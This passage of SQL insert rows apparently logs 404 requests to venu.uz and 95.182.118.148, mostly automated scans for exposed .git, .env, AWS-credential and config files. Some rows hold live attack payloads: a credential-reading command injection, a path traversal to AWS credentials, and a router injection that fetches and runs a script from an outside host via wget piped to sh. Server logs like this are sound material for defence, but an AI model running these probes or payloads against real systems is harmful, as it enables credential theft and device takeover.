(420,404,'https://venu.uz/.git/refs/remotes/origin/staging',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:16'),
(421,404,'https://venu.uz/.git/refs/stash',6,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:16'),
(422,404,'https://venu.uz/.git/refs/wip/wtree/refs/heads/main',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:16'),
(423,404,'https://venu.uz/.git/refs/wip/wtree/refs/heads/staging',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:15'),
(424,404,'https://venu.uz/.git/FETCH_HEAD',5,NULL,NULL,'2025-06-25 01:28:51','2025-07-07 10:32:17'),
(425,404,'https://venu.uz/.git/refs/remotes/origin/HEAD',6,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:17'),
(426,404,'https://venu.uz/.git/refs/heads/staging',3,NULL,NULL,'2025-06-25 01:28:51','2025-07-12 09:03:17'),
(427,404,'https://venu.uz/.git/refs/heads/production',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:15'),
(428,404,'https://venu.uz/.git/refs/wip/index/refs/heads/staging',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(429,404,'https://venu.uz/.git/refs/remotes/origin/production',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(430,404,'https://venu.uz/.git/refs/heads/master',6,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(431,404,'https://venu.uz/.git/refs/wip/index/refs/heads/main',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(432,404,'https://venu.uz/.git/refs/wip/wtree/refs/heads/master',6,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(433,404,'https://venu.uz/.git/refs/wip/wtree/refs/heads/production',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(434,404,'https://venu.uz/.git/refs/wip/index/refs/heads/master',6,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(435,404,'https://venu.uz/.git/refs/remotes/origin/development',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(436,404,'https://venu.uz/.git/refs/wip/index/refs/heads/development',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(437,404,'https://venu.uz/.git/refs/wip/index/refs/heads/production',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(438,404,'https://venu.uz/.git/refs/heads/development',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(439,404,'https://venu.uz/.git/refs/wip/wtree/refs/heads/development',3,NULL,NULL,'2025-06-25 01:28:52','2025-07-12 09:03:16'),
(440,404,'https://venu.uz/.git/logs/refs/heads/master',6,NULL,NULL,'2025-06-25 01:28:53','2025-07-12 09:03:15'),
(441,404,'https://venu.uz/.git/objects/00/00000000000000000000000000000000000000',6,NULL,NULL,'2025-06-25 01:30:55','2025-07-12 09:03:23'),
(442,404,'https://95.182.118.148/geoserver/web',1,NULL,NULL,'2025-06-25 06:53:38','2025-06-25 06:53:38'),
(443,404,'https://venu.uz/.env.bak',15,NULL,NULL,'2025-06-25 08:58:09','2025-07-11 01:00:13'),
(444,404,'https://venu.uz/phpmyadmin',4,NULL,NULL,'2025-06-25 08:58:22','2025-07-09 22:26:09'),
(445,404,'https://95.182.118.148/aaa9',1,NULL,NULL,'2025-06-25 13:49:20','2025-06-25 13:49:20'),
(446,404,'https://95.182.118.148/aab8',1,NULL,NULL,'2025-06-25 13:49:43','2025-06-25 13:49:43'),
(447,404,'https://venu.uz/ads.txt',1,NULL,NULL,'2025-06-25 15:50:59','2025-06-25 15:50:59'),
(448,404,'https://95.182.118.148/twilio.env',3,NULL,NULL,'2025-06-25 16:17:40','2025-06-26 12:49:00'),
(449,404,'https://95.182.118.148/aws.env',2,NULL,NULL,'2025-06-25 16:17:41','2025-06-26 12:49:01'),
(450,404,'https://95.182.118.148/.env:443/.git/config',1,NULL,NULL,'2025-06-25 16:33:13','2025-06-25 16:33:13'),
(451,404,'https://95.182.118.148/.env:443/live_env',2,NULL,NULL,'2025-06-25 16:33:14','2025-06-25 16:33:14'),
(452,404,'https://95.182.118.148/.env:443/api/.env',2,NULL,NULL,'2025-06-25 16:33:16','2025-06-25 16:33:16'),
(453,404,'https://95.182.118.148/.env:443/script/.env',2,NULL,NULL,'2025-06-25 16:33:18','2025-06-25 16:33:18'),
(454,404,'https://95.182.118.148/.env:443/core/.env',2,NULL,NULL,'2025-06-25 16:33:20','2025-06-25 16:33:21'),
(455,404,'https://95.182.118.148/.env:443/.env',2,NULL,NULL,'2025-06-25 16:33:23','2025-06-25 16:33:24'),
(456,404,'https://95.182.118.148/.env:443/laravel/.env',2,NULL,NULL,'2025-06-25 16:33:26','2025-06-25 16:33:27'),
(457,404,'https://95.182.118.148/.env:443/sources/.env',2,NULL,NULL,'2025-06-25 16:33:30','2025-06-25 16:33:31'),
(458,404,'https://95.182.118.148/.env:443/back/.env',2,NULL,NULL,'2025-06-25 16:33:35','2025-06-25 16:33:35'),
(459,404,'https://95.182.118.148/.env:443/enviroments/.env.production',2,NULL,NULL,'2025-06-25 16:33:37','2025-06-25 16:33:37'),
(460,404,'https://95.182.118.148/.env:443/private/.env',2,NULL,NULL,'2025-06-25 16:33:39','2025-06-25 16:33:39'),
(461,404,'https://95.182.118.148/.env:443/.env.save',2,NULL,NULL,'2025-06-25 16:33:41','2025-06-25 16:33:42'),
(462,404,'https://95.182.118.148/.env:443/system/.env',2,NULL,NULL,'2025-06-25 16:33:43','2025-06-25 16:33:44'),
(463,404,'https://95.182.118.148/.env:443/enviroments/.env',2,NULL,NULL,'2025-06-25 16:33:47','2025-06-25 16:33:48'),
(464,404,'https://95.182.118.148/.env:443/admin-app/.env',2,NULL,NULL,'2025-06-25 16:33:50','2025-06-25 16:33:51'),
(465,404,'https://95.182.118.148/.env:443/rest/.env',2,NULL,NULL,'2025-06-25 16:33:53','2025-06-25 16:33:54'),
(466,404,'https://95.182.118.148/.env:443/development/.env',2,NULL,NULL,'2025-06-25 16:33:56','2025-06-25 16:33:56'),
(467,404,'https://95.182.118.148/.env:443/shared/.env',2,NULL,NULL,'2025-06-25 16:33:58','2025-06-25 16:33:59'),
(468,404,'https://95.182.118.148/.env:443/apps/.env',2,NULL,NULL,'2025-06-25 16:34:00','2025-06-25 16:34:01'),
(469,404,'https://95.182.118.148/.env:443/cp/.env',2,NULL,NULL,'2025-06-25 16:34:03','2025-06-25 16:34:04'),
(470,404,'https://95.182.118.148/.env:443/docker/.env',2,NULL,NULL,'2025-06-25 16:34:09','2025-06-25 16:34:09'),
(471,404,'https://95.182.118.148/.env:443/.env.project',2,NULL,NULL,'2025-06-25 16:34:11','2025-06-25 16:34:11'),
(472,404,'https://95.182.118.148/.env:443/.env.production',2,NULL,NULL,'2025-06-25 16:34:15','2025-06-25 16:34:16'),
(473,404,'https://95.182.118.148/.env:443/fedex/.env',2,NULL,NULL,'2025-06-25 16:34:17','2025-06-25 16:34:17'),
(474,404,'https://95.182.118.148/.env:443/application/.env',2,NULL,NULL,'2025-06-25 16:34:19','2025-06-25 16:34:19'),
(475,404,'https://95.182.118.148/.env:443/.env.prod',2,NULL,NULL,'2025-06-25 16:34:23','2025-06-25 16:34:24'),
(476,404,'https://95.182.118.148/.env:443/.env.development',2,NULL,NULL,'2025-06-25 16:34:27','2025-06-25 16:34:28'),
(477,404,'https://95.182.118.148/.env:443/cms/.env',2,NULL,NULL,'2025-06-25 16:34:29','2025-06-25 16:34:30'),
(478,404,'https://95.182.118.148/.env:443/.env.dist',2,NULL,NULL,'2025-06-25 16:34:32','2025-06-25 16:34:33'),
(479,404,'https://95.182.118.148/.env:443/app/.env',2,NULL,NULL,'2025-06-25 16:34:34','2025-06-25 16:34:35'),
(480,404,'https://95.182.118.148/.env:443/.env.old',2,NULL,NULL,'2025-06-25 16:34:36','2025-06-25 16:34:37'),
(481,404,'https://95.182.118.148/.env:443/local/.env',2,NULL,NULL,'2025-06-25 16:34:38','2025-06-25 16:34:38'),
(482,404,'https://95.182.118.148/.env:443/frontend_dev.php/$',1,NULL,NULL,'2025-06-25 16:34:41','2025-06-25 16:34:41'),
(483,404,'https://95.182.118.148/.env:443/debug/default/view?panel=config',1,NULL,NULL,'2025-06-25 16:34:44','2025-06-25 16:34:44'),
(484,404,'https://95.182.118.148/.env:443/config.json',1,NULL,NULL,'2025-06-25 16:34:46','2025-06-25 16:34:46'),
(485,404,'https://95.182.118.148/.env:443/.json',1,NULL,NULL,'2025-06-25 16:34:51','2025-06-25 16:34:51'),
(486,404,'https://95.182.118.148/.env:443/_profiler/phpinfo',1,NULL,NULL,'2025-06-25 16:34:55','2025-06-25 16:34:55'),
(487,404,'https://95.182.118.148/.env:443?phpinfo=1',1,NULL,NULL,'2025-06-25 16:34:59','2025-06-25 16:34:59'),
(488,404,'https://venu.uz/.aws/config',6,NULL,NULL,'2025-06-25 18:50:41','2025-07-11 01:00:45'),
(489,404,'https://venu.uz/.AWS_/credentials',3,NULL,NULL,'2025-06-25 18:50:41','2025-06-27 12:49:03'),
(490,404,'https://venu.uz/.env.local',9,NULL,NULL,'2025-06-25 18:51:02','2025-07-11 01:00:31'),
(491,404,'https://venu.uz/.env.old',8,NULL,NULL,'2025-06-25 18:51:02','2025-07-11 01:00:14'),
(492,404,'https://venu.uz/.env.prod',7,NULL,NULL,'2025-06-25 18:51:03','2025-07-11 01:00:22'),
(493,404,'https://venu.uz/.env.production.local',6,NULL,NULL,'2025-06-25 18:51:04','2025-07-11 01:00:18'),
(494,404,'https://venu.uz/.env.sample',4,NULL,NULL,'2025-06-25 18:51:04','2025-07-11 01:00:20'),
(495,404,'https://venu.uz/.env.stage',7,NULL,NULL,'2025-06-25 18:51:04','2025-07-11 01:00:16'),
(496,404,'https://venu.uz/.envs/.production/.django',3,NULL,NULL,'2025-06-25 18:51:05','2025-07-06 19:14:06'),
(497,404,'https://venu.uz/.travis.yml',3,NULL,NULL,'2025-06-25 18:51:06','2025-07-06 15:41:58'),
(498,404,'https://venu.uz/.vscode/.env',4,NULL,NULL,'2025-06-25 18:51:06','2025-07-11 01:00:31'),
(499,404,'https://venu.uz/_profiler/phpinfo',9,NULL,NULL,'2025-06-25 18:51:07','2025-07-11 01:01:03'),
(500,404,'https://venu.uz/admin/.env',7,NULL,NULL,'2025-06-25 18:51:08','2025-07-11 01:00:40'),
(501,404,'https://venu.uz/admin/config',3,NULL,NULL,'2025-06-25 18:51:08','2025-06-30 20:31:54'),
(502,404,'https://venu.uz/admin/config?cmd=cat%20%2Froot%2F.aws%2Fcredentials',9,NULL,NULL,'2025-06-25 18:51:09','2025-07-11 10:45:34'),
(503,404,'https://venu.uz/admin/controllers/merchant.js',2,NULL,NULL,'2025-06-25 18:51:10','2025-06-26 08:26:10'),
(504,404,'https://venu.uz/admin/controllers/partner.js',2,NULL,NULL,'2025-06-25 18:51:10','2025-06-26 08:26:11'),
(505,404,'https://venu.uz/api/config.js',2,NULL,NULL,'2025-06-25 18:51:11','2025-06-26 08:26:12'),
(506,404,'https://venu.uz/api/config/config.yml',2,NULL,NULL,'2025-06-25 18:51:12','2025-06-26 08:26:12'),
(507,404,'https://venu.uz/api/config.env',2,NULL,NULL,'2025-06-25 18:51:12','2025-06-26 08:26:13'),
(508,404,'https://venu.uz/api/objects/codes.php.save',2,NULL,NULL,'2025-06-25 18:51:28','2025-06-26 08:26:13'),
(509,404,'https://venu.uz/api/shared/.env',2,NULL,NULL,'2025-06-25 18:51:29','2025-06-26 08:26:13'),
(510,404,'https://venu.uz/api/shared/config.env',2,NULL,NULL,'2025-06-25 18:51:29','2025-06-26 08:26:14'),
(511,404,'https://venu.uz/api/shared/config/.env',2,NULL,NULL,'2025-06-25 18:51:29','2025-06-26 08:26:14'),
(512,404,'https://venu.uz/api/shared/config/config.env',3,NULL,NULL,'2025-06-25 18:51:30','2025-06-27 12:48:58'),
(513,404,'https://venu.uz/app.js',3,NULL,NULL,'2025-06-25 18:51:30','2025-06-30 20:31:40'),
(514,404,'https://venu.uz/app/.env',8,NULL,NULL,'2025-06-25 18:51:31','2025-07-11 01:00:39'),
(515,404,'https://venu.uz/app/config/parameters.yml',2,NULL,NULL,'2025-06-25 18:51:31','2025-06-26 08:26:16'),
(516,404,'https://venu.uz/app_dev.php/_profiler/phpinfo',3,NULL,NULL,'2025-06-25 18:51:31','2025-06-30 20:31:41'),
(517,404,'https://venu.uz/appsettings.json',3,NULL,NULL,'2025-06-25 18:51:32','2025-06-30 20:31:36'),
(518,404,'https://venu.uz/application/.env',4,NULL,NULL,'2025-06-25 18:51:32','2025-07-11 01:01:02'),
(519,404,'https://venu.uz/application.properties',3,NULL,NULL,'2025-06-25 18:51:33','2025-06-30 20:31:33'),
(520,404,'https://venu.uz/apps/.env',6,NULL,NULL,'2025-06-25 18:51:33','2025-07-06 15:41:51'),
(521,404,'https://venu.uz/aws-secret.yaml',4,NULL,NULL,'2025-06-25 18:51:33','2025-07-11 01:01:06'),
(522,404,'https://venu.uz/aws.yml',3,NULL,NULL,'2025-06-25 18:51:34','2025-07-06 15:41:10'),
(523,404,'https://venu.uz/aws/credentials',4,NULL,NULL,'2025-06-25 18:51:34','2025-07-06 15:40:57'),
(524,404,'https://venu.uz/awstats/.env',3,NULL,NULL,'2025-06-25 18:51:35','2025-07-11 01:01:06'),
(525,404,'https://venu.uz/backend/.env',5,NULL,NULL,'2025-06-25 18:51:35','2025-07-11 01:00:39'),
(526,404,'https://venu.uz/backend/config/default.yml',2,NULL,NULL,'2025-06-25 18:51:35','2025-06-26 08:26:20'),
(527,404,'https://venu.uz/backend/config/development.yml',2,NULL,NULL,'2025-06-25 18:51:36','2025-06-26 08:26:20'),
(528,404,'https://venu.uz/backend/config/settings.yml',2,NULL,NULL,'2025-06-25 18:51:36','2025-06-26 08:26:20'),
(529,404,'https://venu.uz/blog.env',3,NULL,NULL,'2025-06-25 18:51:37','2025-07-06 19:13:42'),
(530,404,'https://venu.uz/cloud/Scraper.js',2,NULL,NULL,'2025-06-25 18:51:37','2025-06-26 08:26:21'),
(531,404,'https://venu.uz/conf/.env',3,NULL,NULL,'2025-06-25 18:51:37','2025-07-11 01:01:07'),
(532,404,'https://venu.uz/config.js',4,NULL,NULL,'2025-06-25 18:51:38','2025-07-06 15:41:54'),
(533,404,'https://venu.uz/config/application.yml',4,NULL,NULL,'2025-06-25 18:51:38','2025-07-06 15:41:17'),
(534,404,'https://venu.uz/config/aws.yml',4,NULL,NULL,'2025-06-25 18:51:54','2025-07-06 15:40:56'),
(535,404,'https://venu.uz/config/config.json',6,NULL,NULL,'2025-06-25 18:51:55','2025-07-11 01:00:52'),
(536,404,'https://venu.uz/config/constants.js',4,NULL,NULL,'2025-06-25 18:51:55','2025-07-06 15:41:21'),
(537,404,'https://venu.uz/config/env',2,NULL,NULL,'2025-06-25 18:51:56','2025-06-26 08:26:24'),
(538,404,'https://venu.uz/config/local.yml',3,NULL,NULL,'2025-06-25 18:51:56','2025-07-06 15:41:25'),
(539,404,'https://venu.uz/config/parameters.yml',3,NULL,NULL,'2025-06-25 18:52:11','2025-07-06 15:41:18'),
(540,404,'https://venu.uz/config/secrets.json',6,NULL,NULL,'2025-06-25 18:52:11','2025-07-11 01:00:49'),
(541,404,'https://venu.uz/config/settings.json',5,NULL,NULL,'2025-06-25 18:52:12','2025-07-06 19:14:09'),
(542,404,'https://venu.uz/config/settings.local',3,NULL,NULL,'2025-06-25 18:52:12','2025-07-06 15:41:18'),
(543,404,'https://venu.uz/config/settings.prod',3,NULL,NULL,'2025-06-25 18:52:13','2025-07-06 15:41:20'),
(544,404,'https://venu.uz/config/storage.yml',3,NULL,NULL,'2025-06-25 18:52:13','2025-07-06 15:41:23'),
(545,404,'https://venu.uz/controller/admin/post.js',2,NULL,NULL,'2025-06-25 18:52:32','2025-06-26 08:26:28'),
(546,404,'https://venu.uz/controller/api/post.js',2,NULL,NULL,'2025-06-25 18:52:32','2025-06-26 08:26:28'),
(547,404,'https://venu.uz/controllers/settings.js',2,NULL,NULL,'2025-06-25 18:52:33','2025-06-26 08:26:28'),
(548,404,'https://venu.uz/core/.env',3,NULL,NULL,'2025-06-25 18:52:33','2025-07-11 01:01:01'),
(549,404,'https://venu.uz/crm/.env',3,NULL,NULL,'2025-06-25 18:52:33','2025-07-11 01:00:56'),
(550,404,'https://venu.uz/cron/.env',3,NULL,NULL,'2025-06-25 18:52:34','2025-07-11 01:01:07'),
(551,404,'https://venu.uz/debug/default/view',2,NULL,NULL,'2025-06-25 18:52:34','2025-06-26 08:26:30'),
(552,404,'https://venu.uz/development/.env',2,NULL,NULL,'2025-06-25 18:52:53','2025-06-26 08:26:31'),
(553,404,'https://venu.uz/dev/.env',3,NULL,NULL,'2025-06-25 18:52:53','2025-07-11 01:00:50'),
(554,404,'https://venu.uz/docker/.env',4,NULL,NULL,'2025-06-25 18:53:10','2025-07-11 01:00:57'),
(555,404,'https://venu.uz/docker/app/.env',3,NULL,NULL,'2025-06-25 18:53:10','2025-07-11 01:01:08'),
(556,404,'https://venu.uz/env/.env',4,NULL,NULL,'2025-06-25 18:53:10','2025-07-11 01:01:04'),
(557,404,'https://venu.uz/env.backup',4,NULL,NULL,'2025-06-25 18:53:11','2025-07-11 01:01:08'),
(558,404,'https://venu.uz/gatsby-config.js',2,NULL,NULL,'2025-06-25 18:53:11','2025-06-26 08:26:34'),
(559,404,'https://venu.uz/getcpuutil.php-bakworking',2,NULL,NULL,'2025-06-25 18:53:11','2025-06-26 08:26:34'),
(560,404,'https://venu.uz/helper.js',2,NULL,NULL,'2025-06-25 18:53:12','2025-06-26 08:26:34'),
(561,404,'https://venu.uz/helper/EmailHelper.js',2,NULL,NULL,'2025-06-25 18:53:12','2025-06-26 08:26:35'),
(562,404,'https://venu.uz/index.html',5,NULL,NULL,'2025-06-25 18:53:13','2025-07-06 15:41:59'),
(563,404,'https://venu.uz/index.js',4,NULL,NULL,'2025-06-25 18:53:13','2025-07-06 15:42:00'),
(564,404,'https://venu.uz/js/.env',3,NULL,NULL,'2025-06-25 18:53:14','2025-07-11 01:01:09'),
(565,404,'https://venu.uz/js/main.js',2,NULL,NULL,'2025-06-25 18:53:14','2025-06-26 08:26:37'),
(566,404,'https://venu.uz/karma.conf.json',3,NULL,NULL,'2025-06-25 18:53:15','2025-06-27 12:49:04'),
(567,404,'https://venu.uz/kyc/.env',2,NULL,NULL,'2025-06-25 18:53:15','2025-06-26 08:26:38'),
(568,404,'https://venu.uz/laravel/.env',4,NULL,NULL,'2025-06-25 18:53:16','2025-07-11 01:00:52'),
(569,404,'https://venu.uz/laravel/core/.env',3,NULL,NULL,'2025-06-25 18:53:16','2025-07-11 01:01:09'),
(570,404,'https://venu.uz/library/.env',3,NULL,NULL,'2025-06-25 18:53:16','2025-07-06 19:13:56'),
(571,404,'https://venu.uz/local/.env',3,NULL,NULL,'2025-06-25 18:53:17','2025-07-11 01:01:02'),
(572,404,'https://venu.uz/main.js',3,NULL,NULL,'2025-06-25 18:53:17','2025-06-30 20:31:31'),
(573,404,'https://venu.uz/main.yml',2,NULL,NULL,'2025-06-25 18:53:18','2025-06-26 08:26:40'),
(574,404,'https://venu.uz/main/.env',3,NULL,NULL,'2025-06-25 18:53:18','2025-07-11 01:01:14'),
(575,404,'https://venu.uz/mail/.env',3,NULL,NULL,'2025-06-25 18:53:18','2025-07-11 01:00:56'),
(576,404,'https://venu.uz/mailer/.env',3,NULL,NULL,'2025-06-25 18:53:19','2025-07-11 01:00:56'),
(577,404,'https://venu.uz/my_env/chakaash.py',2,NULL,NULL,'2025-06-25 18:53:19','2025-06-26 08:26:42'),
(578,404,'https://venu.uz/my_env/newsletter.py',2,NULL,NULL,'2025-06-25 18:53:19','2025-06-26 08:26:43'),
(579,404,'https://venu.uz/my_env/palash.py',2,NULL,NULL,'2025-06-25 18:53:20','2025-06-26 08:26:43'),
(580,404,'https://venu.uz/myproject/.env',3,NULL,NULL,'2025-06-25 18:53:20','2025-07-06 19:14:05'),
(581,404,'https://venu.uz/mytest/astech_robot.js',2,NULL,NULL,'2025-06-25 18:53:21','2025-06-26 08:26:44'),
(582,404,'https://venu.uz/new/.env',3,NULL,NULL,'2025-06-25 18:53:21','2025-07-11 01:01:04'),
(583,404,'https://venu.uz/new/.env.local',3,NULL,NULL,'2025-06-25 18:53:21','2025-07-11 01:01:04'),
(584,404,'https://venu.uz/new/.env.production',3,NULL,NULL,'2025-06-25 18:53:22','2025-07-11 01:01:05'),
(585,404,'https://venu.uz/new/.env.staging',3,NULL,NULL,'2025-06-25 18:53:22','2025-07-11 01:01:05'),
(586,404,'https://venu.uz/nginx/.env',3,NULL,NULL,'2025-06-25 18:53:23','2025-07-11 01:01:10'),
(587,404,'https://venu.uz/node/.env_example',2,NULL,NULL,'2025-06-25 18:53:23','2025-06-26 08:26:47'),
(588,404,'https://venu.uz/node-api/.env',3,NULL,NULL,'2025-06-25 18:53:23','2025-07-06 19:14:00'),
(589,404,'https://venu.uz/node_modules/.env',2,NULL,NULL,'2025-06-25 18:53:24','2025-06-26 08:26:48'),
(590,404,'https://venu.uz/nextjs-app/.env',3,NULL,NULL,'2025-06-25 18:53:24','2025-07-06 19:13:58'),
(591,404,'https://venu.uz/partner/config/config.js',2,NULL,NULL,'2025-06-25 18:53:25','2025-06-26 08:26:49'),
(592,404,'https://venu.uz/phpinfo',10,NULL,NULL,'2025-06-25 18:53:25','2025-07-11 01:01:02'),
(593,404,'https://venu.uz/portal/.env',3,NULL,NULL,'2025-06-25 18:53:26','2025-07-11 01:00:55'),
(594,404,'https://venu.uz/prod/.env',2,NULL,NULL,'2025-06-25 18:53:26','2025-06-26 08:26:52'),
(595,404,'https://venu.uz/react-app/.env',4,NULL,NULL,'2025-06-25 18:53:27','2025-07-06 19:14:07'),
(596,404,'https://venu.uz/react-app/.env.production',3,NULL,NULL,'2025-06-25 18:53:28','2025-07-06 19:14:08'),
(597,404,'https://venu.uz/scripts/nodemailer.js',2,NULL,NULL,'2025-06-25 18:53:28','2025-06-26 08:26:54'),
(598,404,'https://venu.uz/s3.js',2,NULL,NULL,'2025-06-25 18:53:28','2025-06-26 08:26:54'),
(599,404,'https://venu.uz/server-info',3,NULL,NULL,'2025-06-25 18:53:29','2025-07-11 01:01:18'),
(600,404,'https://venu.uz/server.js',4,NULL,NULL,'2025-06-25 18:53:43','2025-07-06 15:42:00'),
(601,404,'https://venu.uz/server/config/database.js',3,NULL,NULL,'2025-06-25 18:53:43','2025-07-06 15:41:14'),
(602,404,'https://venu.uz/service/email_service.py',2,NULL,NULL,'2025-06-25 18:53:44','2025-06-26 08:26:56'),
(603,404,'https://venu.uz/shared/config/config.js',2,NULL,NULL,'2025-06-25 18:53:45','2025-06-26 08:26:57'),
(604,404,'https://venu.uz/site/.env',3,NULL,NULL,'2025-06-25 18:53:45','2025-07-11 01:01:10'),
(605,404,'https://venu.uz/sms.py',2,NULL,NULL,'2025-06-25 18:53:46','2025-06-26 08:26:59'),
(606,404,'https://venu.uz/static/js/main.js',2,NULL,NULL,'2025-06-25 18:53:46','2025-06-26 08:26:59'),
(607,404,'https://venu.uz/swagger.js',2,NULL,NULL,'2025-06-25 18:53:47','2025-06-26 08:27:01'),
(608,404,'https://venu.uz/swagger.json',2,NULL,NULL,'2025-06-25 18:53:48','2025-06-26 08:27:01'),
(609,404,'https://venu.uz/user/config/config.js',2,NULL,NULL,'2025-06-25 18:54:01','2025-06-26 08:27:02'),
(610,404,'https://venu.uz/user/controllers/index.js',2,NULL,NULL,'2025-06-25 18:54:14','2025-06-26 08:27:02'),
(611,404,'https://venu.uz/web/.env',3,NULL,NULL,'2025-06-25 18:54:31','2025-07-11 01:00:41'),
(612,404,'https://venu.uz/website/.env',2,NULL,NULL,'2025-06-25 18:54:32','2025-06-26 08:27:03'),
(613,404,'https://venu.uz/wp-config',4,NULL,NULL,'2025-06-25 18:54:32','2025-07-11 01:01:06'),
(614,404,'https://venu.uz/wp-config.php.bak',4,NULL,NULL,'2025-06-25 18:54:33','2025-07-11 01:01:19'),
(615,404,'https://venu.uz/wp-content/.env',3,NULL,NULL,'2025-06-25 18:54:33','2025-07-06 19:13:43'),
(616,404,'https://venu.uz/xampp/.env',4,NULL,NULL,'2025-06-25 18:54:33','2025-07-11 01:01:11'),
(617,404,'https://venu.uz/www/.env',3,NULL,NULL,'2025-06-25 18:54:35','2025-07-11 01:01:07'),
(618,404,'https://venu.uz/config.env',3,NULL,NULL,'2025-06-25 18:54:35','2025-07-11 01:00:17'),
(619,404,'https://venu.uz/.env_sample',3,NULL,NULL,'2025-06-25 18:54:35','2025-07-11 01:00:14'),
(620,404,'https://venu.uz/static/js/main.141b0494.js',2,NULL,NULL,'2025-06-25 18:54:36','2025-06-26 08:27:07'),
(621,404,'https://venu.uz/static/js/2.ca066a4b.chunk.js',2,NULL,NULL,'2025-06-25 18:54:36','2025-06-26 08:27:08'),
(622,404,'https://venu.uz/static/js/main.e85f7a37.js',2,NULL,NULL,'2025-06-25 18:54:37','2025-06-26 08:27:08'),
(623,404,'https://venu.uz/app.py',2,NULL,NULL,'2025-06-25 18:54:38','2025-06-26 08:27:09'),
(624,404,'https://venu.uz/apis/config/config.js',2,NULL,NULL,'2025-06-25 18:54:38','2025-06-26 08:27:09'),
(625,404,'https://venu.uz/apis/controllers/users.js',2,NULL,NULL,'2025-06-25 18:54:38','2025-06-26 08:27:10'),
(626,404,'https://venu.uz/configs/routes-4aug.js',2,NULL,NULL,'2025-06-25 18:54:39','2025-06-26 08:27:10'),
(627,404,'https://venu.uz/configs/routes.js',2,NULL,NULL,'2025-06-25 18:54:39','2025-06-26 08:27:11'),
(628,404,'https://venu.uz/configs/s3_config.json',2,NULL,NULL,'2025-06-25 18:54:39','2025-06-26 08:27:11'),
(629,404,'https://venu.uz/.circleci/configs/development.yml',2,NULL,NULL,'2025-06-25 18:54:40','2025-06-26 08:27:12'),
(630,404,'https://venu.uz/helpers/utility.js',2,NULL,NULL,'2025-06-25 18:54:40','2025-06-26 08:27:12'),
(631,404,'https://venu.uz/server/s3.js',2,NULL,NULL,'2025-06-25 18:54:41','2025-06-26 08:27:13'),
(632,404,'https://95.182.118.148/autodiscover/autodiscover.json?%40zdi%2FPowershell=',1,NULL,NULL,'2025-06-25 20:45:45','2025-06-25 20:45:45'),
(633,404,'https://venu.uz/pms?file_name=..%2F..%2F..%2F..%2F..%2F..%2F~%2F.aws%2Fcredentials&module=logging&number_of_lines=10000',9,NULL,NULL,'2025-06-25 20:46:46','2025-07-11 10:45:33'),
(634,404,'https://venu.uz//wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:53:53','2025-07-10 19:14:58'),
(635,404,'https://venu.uz//blog/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:55','2025-07-10 19:15:00'),
(636,404,'https://venu.uz//web/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:55','2025-07-10 19:15:01'),
(637,404,'https://venu.uz//wordpress/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:56','2025-07-10 19:15:01'),
(638,404,'https://venu.uz//website/wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:53:56','2025-07-10 19:15:02'),
(639,404,'https://venu.uz//wp/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:57','2025-07-10 19:15:02'),
(640,404,'https://venu.uz//news/wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:53:57','2025-07-10 19:15:03'),
(641,404,'https://venu.uz//2018/wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:53:58','2025-07-10 19:15:03'),
(642,404,'https://venu.uz//2019/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:58','2025-07-10 19:15:04'),
(643,404,'https://venu.uz//shop/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:59','2025-07-10 19:15:04'),
(644,404,'https://venu.uz//wp1/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:53:59','2025-07-10 19:15:04'),
(645,404,'https://venu.uz//test/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:54:00','2025-07-10 19:15:05'),
(646,404,'https://venu.uz//media/wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:54:01','2025-07-10 19:15:05'),
(647,404,'https://venu.uz//wp2/wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:54:01','2025-07-10 19:15:06'),
(648,404,'https://venu.uz//site/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:54:02','2025-07-10 19:15:06'),
(649,404,'https://venu.uz//cms/wp-includes/wlwmanifest.xml',18,NULL,NULL,'2025-06-26 00:54:02','2025-07-10 19:15:07'),
(650,404,'https://venu.uz//sito/wp-includes/wlwmanifest.xml',4,NULL,NULL,'2025-06-26 00:54:03','2025-07-10 19:15:07'),
(651,404,'https://95.182.118.148/version',2,NULL,NULL,'2025-06-26 03:35:20','2025-06-26 09:39:31'),
(652,404,'https://95.182.118.148/cgi-bin/luci/;stok=/locale?country=%24%28wget%20http%3A%2F%2F220.158.232.99%2Fx%2Ftplink%20-O-%7Csh%29&form=country&operation=write',2,NULL,NULL,'2025-06-26 07:00:27','2025-06-26 07:00:37'),
(653,404,'https://95.182.118.148/containers/json',1,NULL,NULL,'2025-06-26 09:39:31','2025-06-26 09:39:31'),
